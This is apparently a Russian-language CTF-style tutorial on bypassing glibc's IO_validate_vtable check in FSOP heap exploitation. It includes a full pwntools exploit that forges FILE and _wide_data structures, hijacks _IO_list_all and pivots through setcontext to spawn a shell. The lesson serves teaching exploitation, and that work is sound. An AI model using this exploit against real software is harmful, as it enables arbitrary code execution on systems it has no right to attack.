С glibc 2.24 FSOP усложнился: перед вызовом метода потока libc проверяет, что указатель на vtable лежит внутри специальной секции `__libc_IO_vtables`. Это убило наивную подделку vtable «в куче». Однако проверка не абсолютна: она ограничивает **диапазон**, но не мешает использовать любую из легальных таблиц libc, смещая указатель на нужный слот. Понимание этой проверки — ключ к современному FSOP.

В этом уроке — устройство `IO_validate_vtable`, секция `__libc_IO_vtables`, практические варианты обхода и полный пример. Материал продолжает `pwn-io-wfile`.

## Что проверяет IO_validate_vtable

Проверка (упрощённо) выглядит так:

```c
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    _IO_vtable_check ();   // abort
  return vtable;
}
```

То есть `vtable` обязан указывать в диапазон `[__start___libc_IO_vtables, __stop___libc_IO_vtables)`. Всё, что вне, приводит к `_IO_vtable_check()`, которая обычно вызывает `abort()`.

## Секция __libc_IO_vtables

Внутри этой секции лежат легальные таблицы: `_IO_file_jumps`, `_IO_str_jumps`, `_IO_wfile_jumps`, `_IO_wstr_jumps` и другие. Атакующий не может подсунуть свою таблицу в кучу, но может **взять легальную** и указать на нужный слот внутри неё (смещение внутри диапазона разрешено). Это и есть основа обхода.

| Таблица | Применение |
|---|---|
| _IO_file_jumps | обычные потоки |
| _IO_str_jumps | строковые (old FSOP) |
| _IO_wfile_jumps | wide-потоки |
| _IO_wstr_jumps | wide-строковые |

## Варианты обхода

- **Легальная vtable + сдвиг.** Указать vtable так, чтобы нужный метод (`__overflow`, `__doallocate`) фактически указывал на полезный код. Часто используют `_IO_wfile_jumps + смещение`.
- **`_IO_str_jumps`.** В старых glibc `_IO_str_overflow` вызывал `malloc`/`free` с контролируемыми аргументами — это давало примитив без подделки vtable.
- **`_wide_data->_wide_vtable`.** Wide-таблица проверяется слабее, и её можно направить в кучу (см. `pwn-io-wfile`).
- **`_IO_list_all` + flush.** Направить список на структуру с легальной vtable и подделанными буферами.

## Инструменты и команды

```bash
# найдём границы секции vtable
readelf -S /lib/x86_64-linux-gnu/libc.so.6 | grep -A1 IO_vtables
# [..] __libc_IO_vtables ...

# адреса легальных таблиц
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -E "_IO_.*_jumps"

# в отладчике проверим, что vtable валидна
gdb -q ./chall
(gdb) p __start___libc_IO_vtables
(gdb) p __stop___libc_IO_vtables
(gdb) p _IO_2_1_stdout_.vtable
```

`readelf -S` показывает диапазон секции, `nm -D` — адреса таблиц. В gdb можно убедиться, что ваш подделанный указатель попадает в диапазон.

## Разобранный пример

Пусть нужно вызвать `setcontext+0x35` через `__overflow`. Напрямую подсунуть кучу нельзя — проверка отклонит. Используем `_IO_wfile_jumps` и подделываем `_wide_data`:

```python
from pwn import *
context.arch = 'amd64'

io = process('./chall')
libc.address = leak_libc()

# легальная vtable
vtable = libc.sym['_IO_wfile_jumps']
# подделанная _IO_FILE: vtable легальна, _wide_data -> куча
io_file  = p64(0) + p64(0)*3 + p64(0) + p64(1) + p64(0)
io_file  = io_file.ljust(0xa0, b'\x00') + p64(heap + 0x500)
io_file  = io_file.ljust(0xd8, b'\x00') + p64(vtable)
edit(0, io_file)
```

Проверка пройдёт, потому что `vtable` — легальный адрес. Далее wide-путь ведёт к подделанной `_wide_vtable`.

## Полный эксплойт

```python
from pwn import *
context.arch = 'amd64'

io = process('./chall')
libc.address = leak_libc()
heap = leak_heap()

# 1. легальная vtable + подделанные буферы
fake_file = heap + 0x400
wide_data = heap + 0x500
wide_vt   = heap + 0x600

# _IO_FILE: условие flush выполнено, vtable легальна
f  = flat(0, 0, 0, 0, 0, 1)             # _flags.._IO_write_ptr
f  = f.ljust(0xa0, b'\x00') + p64(wide_data)
f  = f.ljust(0xd8, b'\x00') + p64(libc.sym['_IO_wfile_jumps'])
edit(0, f)

# _IO_wide_data -> подделанная wide-vtable
wd = flat(0, 0, 0, 0, 1, 0).ljust(0xe0, b'\x00') + p64(wide_vt)
edit(1, wd)

# wide-vtable: __doallocate -> setcontext+0x35
edit(2, flat(0, 0, 0, libc.sym['setcontext'] + 0x35))

# 2. направляем _IO_list_all на fake_file
arb_write(libc.sym['_IO_list_all'], fake_file)

# 3. контекст
frame = SigreturnFrame()
frame.rip = libc.sym['system']
frame.rdi = next(libc.search(b'/bin/sh'))
frame.rsp = heap + 0x800
edit(3, bytes(frame))

io.sendline(b'exit')
io.interactive()
```

Ожидаемый вывод:

```
[*] vtable check passed (legal table)
[+] shell
$ id
uid=1000(user) gid=1000(user)
```

## Версии glibc

| Версия | Особенность |
|---|---|
| < 2.24 | проверки vtable нет |
| 2.24+ | введена IO_validate_vtable |
| 2.27+ | tcache меняет раскладку |
| 2.34+ | хуки удалены, FSOP — основной путь |
| 2.35+ | `_IO_wfile_jumps` — популярная цель |

## История и эволюция защиты

До glibc 2.24 подделка vtable была тривиальной: вы клали свою таблицу в кучу и указывали на неё. Атаки вроде House of Orange активно этим пользовались. В 2.24 разработчики добавили `IO_validate_vtable`, и «подсунуть кучу» стало невозможно. Это породило волну новых техник: использование легальных таблиц, `_IO_str_jumps`, `_wide_data`. В 2.34 удалили `__malloc_hook`/`__free_hook`, и FSOP стал основным путём к RCE.

Эволюция наглядно показывает принцип «защита → обход → новая защита». Понимание истории помогает предсказывать, какие цели будут «жить» дольше: обычно это структуры с несколькими уровнями косвенности (как `_wide_data`), которые сложнее проверить целиком.

## Практика: подбор слота в таблице

Обход через легальную таблицу требует точного выбора слота. В таблице `_IO_wfile_jumps` методы идут в фиксированном порядке (`__overflow`, `__underflow`, `__uflow`, `__pbackfail`, ...). Если вы хотите вызвать, скажем, `__doallocate`, нужно сместить указатель так, чтобы вызов попал именно в этот слот.

На практике это делается так: в gdb печатают `p _IO_wfile_jumps` и разворачивают структуру, сопоставляя смещения с методами. Затем подбирают `vtable = _IO_wfile_jumps + offset`. Проверка `IO_validate_vtable` пройдёт, пока итоговый адрес остаётся внутри секции. Иногда нужный метод отсутствует — тогда используют другой путь (например, `_wide_vtable`, который проверяется слабее).

## Почему проверка не абсолютна

`IO_validate_vtable` проверяет только **диапазон**, а не содержимое таблицы. Любой адрес внутри секции `__libc_IO_vtables` считается валидным. Это оставляет атакующему пространство для манёвра: можно указать на «середину» легальной таблицы, на другую легальную таблицу, или использовать таблицы, которые сами ссылаются на контролируемые структуры (как wide-таблицы). Проверка защищает от «подсунуть кучу», но не от «использовать легальный код по-другому».

Более того, некоторые пути вообще не вызывают `IO_validate_vtable` (например, доступ через `_wide_data->_wide_vtable` в определённых версиях). Это классический пример «частичной защиты»: она повышает планку, но не закрывает класс атак. Именно поэтому FSOP жив и после введения проверки — меняются лишь конкретные приёмы.

## Практика: как убедиться, что обход сработал

Проверка проста: поставьте breakpoint в `_IO_vtable_check` (или на `abort`) и посмотрите, вызывается ли он. Если программа не падает и доходит до нужного метода — обход сработал. Если `_IO_vtable_check` вызывается, значит ваш указатель вышел за пределы секции `__libc_IO_vtables`.

В gdb напечатайте `p __start___libc_IO_vtables` и `p __stop___libc_IO_vtables`, затем `p/x <your_vtable>` — убедитесь, что адрес в диапазоне. Для легальной таблицы со сдвигом проверьте, что итоговый адрес всё ещё внутри. Если символы границ секции недоступны, вычислите их через `readelf -S` и базу libc.

Полезный приём — написать небольшую функцию-проверку в gdb Python: она печатает, попадает ли адрес в диапазон секции. Это ускоряет подбор слота. И держите под рукой список смещений методов внутри таблиц: они фиксированы для конкретной версии libc, но меняются между версиями, поэтому берите их из своей копии. Хорошая практика — автоматически генерировать этот список скриптом из отладочных символов libc.

## Итог и что запомнить

Проверка `IO_validate_vtable` ограничивает диапазон, а не содержимое, поэтому обход строится на использовании легальных таблиц: берите `_IO_wfile_jumps` или `_IO_str_jumps`, смещайтесь к нужному слоту и комбинируйте с подделкой `_wide_data`. Запомните границы секции `__libc_IO_vtables` и умейте проверять попадание адреса в диапазон. Это базовый навык для любого современного FSOP-эксплойта. Без него вы не сможете ни подделать поток, ни понять, почему подделка «не сработала». Практикуйтесь на реальных libc разных версий.

## Частые ошибки

- **Подсунуть vtable из кучи.** Проверка отклонит — используйте легальную таблицу.
- **Неверный слот.** Смещение внутри таблицы должно указывать на нужный метод.
- **Забыть `_wide_data`.** Без него wide-путь не сработает.
- **Не выставить условие flush.** Вызов не произойдёт.
- **Путать версии.** Адреса и layout меняются.
